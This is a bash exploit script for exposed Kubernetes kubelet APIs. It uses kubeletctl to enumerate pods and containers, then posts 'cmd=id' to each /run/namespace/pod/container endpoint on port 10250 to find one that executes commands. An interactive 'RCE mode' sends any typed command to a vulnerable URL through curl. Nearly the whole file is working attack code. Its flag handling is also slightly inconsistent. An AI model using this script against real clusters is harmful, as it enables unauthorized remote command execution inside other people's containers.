#!/bin/bash

# REQUIREMENT CHECK
if ! command -v kubeletctl > /dev/null; then
  printf "[!] Seems like you don't have kubeletctl installed\nOfficial repo => https://github.com/cyberark/kubeletctl\n"
  exit 0
fi

# FLAGS
ip=''
port=10250
rce=false

# PARSE FLAGS
while getopts i:p:r: opt; do
  case "$opt" in
    i) ip=${OPTARG};;
    p) port=${OPTARG};;
    r) rce=${OPTARG};;
  esac
done

# IF USING RCE MODE:
if [[ ! -z $rce ]]; then
  printf "RCE MODE\n[!] clear command will be executed locally if inputted\n"
  while true; do
    printf "cmd: "
    read -r cmd
    if [[ $cmd == 'clear' ]]; then
      clear
      continue
    fi 
    curl -k -XPOST $rce -d "cmd=$cmd"
    printf "\n"
  done
  exit 0
fi

# CHECK REQUIRED FLAGS
if [[ -z $ip ]]; then
  printf "[!] Flags with '*' are optional\nUSAGE:\n"
  printf "Checking if vulnerable: bash %s -i <ip> -p <port>* -v <verbose>*\n" "$0"
  printf "Remote code execution: bash %s -r <vulnerable url>\n" "$0"
  exit 0
fi

# VARIABLES
sucessrule="^uid+"
data=$(kubeletctl pods --server $ip | strings | sed '/^[[:space:]]*$/d' | grep -v 'POD\|NAMESPACE\|CONTAINERS\|Pods from Kubelet'  > .tempdata)
reps=$(wc -l .tempdata | cut -d " " -f1)
success=false
namespace=''
pod=''
container=''

printf "[!] Starting checks\n"

# CHECK EVERY POSIBILITY OBTAINED FROM KUBELETCTL
for (( i = 1 ; i < $reps ; i+=3 )); do
  pod=$(awk NR==$i  .tempdata | tr -d ' ')
  namespace=$(awk NR==$((i+1)) .tempdata | tr -d ' ')
  container=$(awk NR==$((i+2)) .tempdata | tr -d ' ')
  url="https://$ip:$port/run/$namespace/$pod/$container"
  if [[ $(curl -k -s -XPOST $url -d "cmd=id") =~ $sucessrule ]]; then
    printf "[!] Found one => %s\n" "$url"
    success=true
    continue
  fi
done
rm .tempdata
! $success && printf "[-] Target doesn't seem vulnerable...\n"
